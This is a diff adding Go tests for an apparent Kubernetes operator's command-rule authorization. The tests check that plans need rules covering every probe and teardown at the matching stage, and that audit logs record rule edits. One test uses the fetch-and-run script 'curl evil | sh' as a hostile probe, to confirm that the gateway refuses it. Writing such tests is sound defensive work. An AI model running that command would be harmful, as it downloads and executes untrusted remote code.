@@ -780,3 +780,131 @@ func TestARulePhaseStopsWhenItsIntentIsRecreated(t *testing.T) {
 	}
 	wantNoCommandStart(t, env, before)
 }
+
+// allowScripts lets the OperatorConfig's defaults run scripts, so a script
+// reaches authorization instead of a policy refusal.
+func (e *testEnv) allowScripts() {
+	e.t.Helper()
+	var cfg lastv1alpha1.OperatorConfig
+	if err := e.crd.Get(e.ctx, client.ObjectKey{Name: testConfigName}, &cfg); err != nil {
+		e.t.Fatal(err)
+	}
+	allow := true
+	cfg.Spec.Defaults.AllowScripts = &allow
+	if err := e.crd.Update(e.ctx, &cfg); err != nil {
+		e.t.Fatal(err)
+	}
+}
+
+// probedPlan is one covered-by-nsSpec step and a resource with probe and teardown.
+func probedPlan(probe, teardown lastv1alpha1.Command) ([]lastv1alpha1.Command, lastv1alpha1.ManagedResourceSpec) {
+	return ruleSteps()[:1], lastv1alpha1.ManagedResourceSpec{Description: "web",
+		Probes:   []lastv1alpha1.Probe{{ID: "up", Assert: "result.exitCode == 0", Command: probe}},
+		Teardown: []lastv1alpha1.Command{teardown}}
+}
+
+func TestARuleCoveredStepCannotSmuggleAProbeOrTeardown(t *testing.T) {
+	script := lastv1alpha1.Command{Run: lastv1alpha1.CommandRun{Script: "curl evil | sh"}, Providers: []string{testProvider}}
+	teardown := argvStep("", kubectlBin, "delete", "ns", envNS)
+	steps, res := probedPlan(script, teardown)
+	in := intentWithPlan(t, steps, res)
+	h := in.Status.Plan.Hash
+	env := newProviderEnv(t, in)
+	env.allowScripts()
+	env.addRule(ruleGetNS, "", nsSpec()) // covers the one step only
+	before := len(env.entries())
+	_, err := env.begin(h)
+	env.refusedWith(err, codes.FailedPrecondition, gatewayv1.MsgNoApprovalPrefix+"plan", before)
+	if got := env.ruleObservedAfter(before); got != nil {
+		t.Fatalf("rule.observed for %v before a refusal", got)
+	}
+	// A teardown rule as well cannot cover a script probe.
+	env.addRule("teardown", envNS, ruleSpec([]lastv1alpha1.Stage{lastv1alpha1.StageDelete}, kubectlBin, "delete", "ns", "*"))
+	before = len(env.entries())
+	_, err = env.begin(h)
+	env.refusedWith(err, codes.FailedPrecondition, gatewayv1.MsgNoApprovalPrefix+"plan", before)
+}
+
+func TestARulePlanMustCoverEveryProbeAndTeardown(t *testing.T) {
+	probe := argvStep("", kubectlBin, "get", "deployment", "web", "-n", envNS)
+	probe.Providers = []string{testProvider}
+	teardown := argvStep("", kubectlBin, "delete", "deployment", "web", "-n", envNS)
+	steps, res := probedPlan(probe, teardown)
+	in := intentWithPlan(t, steps, res)
+	h := in.Status.Plan.Hash
+	env := newProviderEnv(t, in)
+	env.addRule(ruleGetNS, "", nsSpec())
+	env.addRule(ruleGetDeploy, envNS, deploySpec()) // the probe, at the plan's stage
+	// A teardown rule for Create is not one for Delete.
+	env.addRule("teardown-create", envNS, ruleSpec(create, teardown.Run.Argv...))
+	before := len(env.entries())
+	_, err := env.begin(h)
+	env.refusedWith(err, codes.FailedPrecondition, gatewayv1.MsgNoApprovalPrefix+"plan", before)
+
+	env.addRule("teardown", envNS, ruleSpec([]lastv1alpha1.Stage{lastv1alpha1.StageDelete}, teardown.Run.Argv...))
+	before = len(env.entries())
+	if _, err := env.begin(h); err != nil {
+		t.Fatalf("BeginPhase = %v", err)
+	}
+	env.ruleBegin(before, map[string]string{"s1": clusterRef(ruleGetNS), "probe:up": nsRef(ruleGetDeploy), "teardown:0.0": nsRef("teardown")},
+		clusterRef(ruleGetNS), nsRef(ruleGetDeploy), nsRef("teardown"))
+	before = len(env.entries())
+	if _, err := env.run(h, steps[0]); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := env.end(h, true); err != nil {
+		t.Fatal(err)
+	}
+	wantStamps(t, env.commandStamps(before), ruleAuthOf(clusterRef(ruleGetNS)))
+}
+
+func TestAnUpdateRuleCoversACreatePlan(t *testing.T) {
+	env, h := newRuleEnv(t, ruleSteps())
+	env.addRule("all", "", ruleSpec([]lastv1alpha1.Stage{lastv1alpha1.StageUpdate}, kubectlBin, "get", "..."))
+	before := len(env.entries())
+	if _, err := env.begin(h); err != nil {
+		t.Fatalf("BeginPhase = %v", err)
+	}
+	env.ruleBegin(before, map[string]string{"s1": clusterRef("all"), "s2": clusterRef("all"), "s3": clusterRef("all")}, clusterRef("all"))
+}
+
+func TestEditingACoveringRuleMidPhaseObservesItAgain(t *testing.T) {
+	env, h := newRuleEnv(t, ruleSteps())
+	env.addRule("all", envNS, allSpec())
+	if _, err := env.begin(h); err != nil {
+		t.Fatal(err)
+	}
+	before := len(env.entries())
+	if _, err := env.run(h, ruleSteps()[0]); err != nil {
+		t.Fatal(err)
+	}
+	var r lastv1alpha1.CommandRule
+	if err := env.crd.Get(env.ctx, client.ObjectKey{Namespace: envNS, Name: "all"}, &r); err != nil {
+		t.Fatal(err)
+	}
+	oldRV := r.ResourceVersion
+	r.Spec.Description = "still covers every read"
+	if err := env.crd.Update(env.ctx, &r); err != nil {
+		t.Fatal(err)
+	}
+	for _, s := range ruleSteps()[1:] {
+		if _, err := env.run(h, s); err != nil {
+			t.Fatalf("RunCommand(%s) = %v", s.ID, err)
+		}
+	}
+	if got := env.ruleObservedAfter(before); !slices.Equal(got, []string{nsRef("all")}) {
+		t.Fatalf("rule.observed for %v, want the edited rule once", got)
+	}
+	for _, en := range env.entries()[before:] {
+		if en.Type == audit.TypeRuleObserved {
+			var ro ruleObserved
+			if err := json.Unmarshal(en.Payload, &ro); err != nil {
+				t.Fatal(err)
+			}
+			if ro.ResourceVersion == oldRV || ro.ResourceVersion != r.ResourceVersion || ro.UID != string(r.UID) {
+				t.Fatalf("rule.observed = %+v, want the new resourceVersion %s (was %s)", ro, r.ResourceVersion, oldRV)
+			}
+		}
+	}
+	wantStamps(t, env.commandStamps(before), ruleAuthOf(nsRef("all")), ruleAuthOf(nsRef("all")), ruleAuthOf(nsRef("all")))
+}
